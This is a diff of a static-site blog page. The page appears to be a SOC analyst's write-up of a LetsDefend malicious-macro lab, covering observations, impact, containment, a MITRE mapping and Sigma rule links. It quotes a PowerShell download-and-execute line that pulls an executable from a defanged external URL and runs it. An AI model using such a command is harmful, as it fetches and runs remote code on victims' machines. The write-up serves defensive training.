-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>(New-Object System.Net.WebClient).DownloadFile(
-</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#39;hxxp://www.greyhathacker.net/tools/messbox.exe&#39;</span>,
-</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#39;mess.exe&#39;</span>
-</span></span><span style="display:flex;"><span>)
-</span></span><span style="display:flex;"><span>Start-Process <span style="color:#e6db74">&#39;mess.exe&#39;</span>
-</span></span></code></pre></div><h3 id="observations">Observations</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">(</span><span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">DownloadFile</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">  <span class="s1">&#39;hxxp://www.greyhathacker.net/tools/messbox.exe&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s1">&#39;mess.exe&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Start-Process</span> <span class="s1">&#39;mess.exe&#39;</span>
+</span></span></code></pre></div><h3 id="observations">Observations<a href="#observations" class="hanchor" ariaLabel="Anchor">#</a> </h3>
 <ul>
 <li>Download attempted from external web server</li>
 <li>HTTP response returned <strong>404</strong>, but DNS and connection attempts were logged</li>
 <li>Firewall logs showed traffic to <strong>92.204.221.16</strong></li>
 </ul>
 <p>This confirms <strong>attempted ingress tool transfer</strong>.</p>
-<h2 id="11-impact-assessment">11. Impact Assessment</h2>
+<h2 id="11-impact-assessment">11. Impact Assessment<a href="#11-impact-assessment" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <ul>
 <li>Malware Execution: <strong>Yes</strong></li>
 <li>System Compromise: <strong>Likely</strong></li>
@@ -499,8 +560,8 @@ The PowerShell command attempted to download a remote executable:</p>
 <li>Data Exposure: <strong>Unknown</strong></li>
 <li>Business Impact: <strong>High Risk</strong></li>
 </ul>
-<h2 id="12-containment--response-actions">12. Containment &amp; Response Actions</h2>
-<p><img src="https://i.ibb.co/8DndGxvy/Pasted-image-20260127220655.png" alt=""></p>
+<h2 id="12-containment--response-actions">12. Containment &amp; Response Actions<a href="#12-containment--response-actions" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p><img src="https://i.ibb.co/8DndGxvy/Pasted-image-20260127220655.png"></p>
 <ul>
 <li>Isolated host <strong>Jayne</strong></li>
 <li>Preserved forensic artifacts</li>
@@ -509,7 +570,7 @@ The PowerShell command attempted to download a remote executable:</p>
 <li>Logged and defanged IOCs</li>
 <li>Closed alert as confirmed incident</li>
 </ul>
-<h2 id="13-mitre-attck-mapping">13. MITRE ATT&amp;CK Mapping</h2>
+<h2 id="13-mitre-attck-mapping">13. MITRE ATT&amp;CK Mapping<a href="#13-mitre-attck-mapping" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <table>
 <thead>
 <tr>
@@ -546,7 +607,7 @@ The PowerShell command attempted to download a remote executable:</p>
 </tr>
 </tbody>
 </table>
-<h2 id="14-artifacts-collected">14. Artifacts Collected</h2>
+<h2 id="14-artifacts-collected">14. Artifacts Collected<a href="#14-artifacts-collected" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <table>
 <thead>
 <tr>
@@ -581,87 +642,130 @@ The PowerShell command attempted to download a remote executable:</p>
 </tr>
 </tbody>
 </table>
-<h2 id="15-sigma-rules">15. Sigma Rules</h2>
+<h2 id="15-sigma-rules">15. Sigma Rules<a href="#15-sigma-rules" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <ul>
 <li><a href="https://github.com/w3nch/Sigma-rules/blob/main/LetsDefend/SOC205%20-%20Malicious%20Macro%20has%20been%20executed/office_macro_spawning_powershell.yml">Office Macro Spawning PowerShell</a></li>
 <li><a href="https://github.com/w3nch/Sigma-rules/blob/main/LetsDefend/SOC205%20-%20Malicious%20Macro%20has%20been%20executed/office_macro_spawning_powershell.yml">PowerShell DownloadFile</a></li>
 <li><a href="https://github.com/w3nch/Sigma-rules/blob/main/LetsDefend/SOC205%20-%20Malicious%20Macro%20has%20been%20executed/office_macro_hidden_shell_execution.yml">Office Macro Hidden Execution (Shell with Hidden Window)</a></li>
 <li><a href="https://github.com/w3nch/Sigma-rules/blob/main/LetsDefend/SOC205%20-%20Malicious%20Macro%20has%20been%20executed/powershell_downloadfile_mess_exe.yml">Office Dropping Executables (mess.exe pattern)</a></li>
 </ul>
-<h2 id="final-verdict">Final Verdict</h2>
+<h2 id="final-verdict">Final Verdict<a href="#final-verdict" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <p><strong>True Positive – Confirmed Malicious Macro Execution</strong></p>
 <p>The macro-enabled Word document successfully executed malicious VBA code that launched PowerShell, attempted to download a remote payload, and communicated with external infrastructure. This incident represents a confirmed malware infection and required immediate containment.</p>
-<h2 id="analyst-note">Analyst Note</h2>
+<h2 id="analyst-note">Analyst Note<a href="#analyst-note" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <p>This case demonstrates a classic phishing-based macro attack chain. Despite modern Office security controls, macro execution was permitted on the system, allowing the attacker to execute PowerShell silently. Strengthening macro policies, improving email filtering, and user awareness training are critical to preventing similar incidents.</p>
-<p><img src="https://i.ibb.co/mCm9jcF3/Pasted-image-20260128172817.png" alt=""></p>
+<p><img src="https://i.ibb.co/mCm9jcF3/Pasted-image-20260128172817.png"></p>
 
-                </div>
-            </article>
+      </div></div>
 
-            <hr />
+  
 
-            <div class="post-info">
-                
-    <p>
-        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
-
-        <span class="tag"><a href="http://localhost:1313/tags/soc/">soc</a></span>
-        <span class="tag"><a href="http://localhost:1313/tags/letsdefend/">letsdefend</a></span>
-        <span class="tag"><a href="http://localhost:1313/tags/malware/">malware</a></span>
-        <span class="tag"><a href="http://localhost:1313/tags/phishing/">phishing</a></span>
-        <span class="tag"><a href="http://localhost:1313/tags/macros/">macros</a></span>
-        <span class="tag"><a href="http://localhost:1313/tags/powershell/">powershell</a></span>
-        <span class="tag"><a href="http://localhost:1313/tags/incident-response/">incident-response</a></span>
-        
-    </p>
-
-                
-    <p>
-        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
-
-        <span class="tag"><a href="http://localhost:1313/categories/soc-analysis/">SOC Analysis</a></span>
-        <span class="tag"><a href="http://localhost:1313/categories/malware-investigation/">Malware Investigation</a></span>
-        
-    </p>
-
-            </div>
-        </main>
-    </div>
-
-
-            
-                <footer class="footer">
+  
     
-    <div class="footer__inner">
-        <div class="footer__content">
-            
-            <span><a href="http://localhost:1313/"></a></span>
-            <span></span>
-            
-            
-        </div>
-    </div>
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
     
+      <div class="copyright copyright--user">
+        <span>© 1337 w3nch</span>
     
-    <div class="footer__inner">
-        <div class="footer__content">
-            <span>Powered by Hugo</span>
-        </div>
-    </div>
-    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
 </footer>
 
-            
-        </div>
-
-        
-
-
-
-<script type="text/javascript" src="/bundle.min.19d7885e5a4b0e5e2cd7238fc80b8b19888099cb78c032aedeb0b3b0010b8bb3dfb34849cf40a9e83f55f266aa32354528c10a24f2a42e6e8e21e813a26d9647.js" integrity="sha512-GdeIXlpLDl4s1yOPyAuLGYiAmct4wDKu3rCzsAELi7Pfs0hJz0Cp6D9V8maqMjVFKMEKJPKkLm6OIegTom2WRw=="></script>
 
 
 
 
-    </body>
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+<script>
+(function() {
+  const themes = {
+    terminal: {
+      '--background': '#1a170f',
+      '--foreground': '#eceae5',
+      '--accent': '#eec35e'
+    },
+    latte: {
+      '--background': '#eff1f5',
+      '--foreground': '#4c4f69',
+      '--accent': '#dc8a78'
+    },
+    frappe: {
+      '--background': '#303446',
+      '--foreground': '#c6d0f5',
+      '--accent': '#f2d5cf'
+    },
+    macchiato: {
+      '--background': '#24273a',
+      '--foreground': '#cad3f5',
+      '--accent': '#f4dbd6'
+    },
+    mocha: {
+      '--background': '#1e1e2e',
+      '--foreground': '#cdd6f4',
+      '--accent': '#f5e0dc'
+    },
+    paper: {
+      '--background': '#faf9f6',
+      '--foreground': '#2d2d2d',
+      '--accent': '#4a4a4a'
+    }
+  };
+
+  const saved = localStorage.getItem('terminal-theme') || 'terminal';
+  function applyTheme(name) {
+    const t = themes[name] || themes.terminal;
+    for (const [k, v] of Object.entries(t)) {
+      document.documentElement.style.setProperty(k, v);
+    }
+    localStorage.setItem('terminal-theme', name);
+    document.querySelectorAll('.theme-btn').forEach(b => {
+      b.classList.toggle('active', b.dataset.theme === name);
+    });
+  }
+
+  function createButtons() {
+    const nav = document.querySelector('.header__inner');
+    if (!nav) return;
+    const div = document.createElement('div');
+    div.className = 'theme-switcher';
+    div.style.cssText = 'display:flex;gap:8px;align-items:center;margin-left:12px;';
+    Object.keys(themes).forEach(name => {
+      const btn = document.createElement('button');
+      btn.className = 'theme-btn';
+      btn.dataset.theme = name;
+      btn.textContent = name.charAt(0).toUpperCase() + name.slice(1);
+      btn.style.cssText = 'padding:4px 10px;font-size:0.75rem;border-width:2px;';
+      btn.onclick = () => applyTheme(name);
+      div.appendChild(btn);
+    });
+    nav.appendChild(div);
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', () => { createButtons(); applyTheme(saved); });
+  } else {
+    createButtons();
+    applyTheme(saved);
+  }
+})();
+</script>
+</body>
 </html>
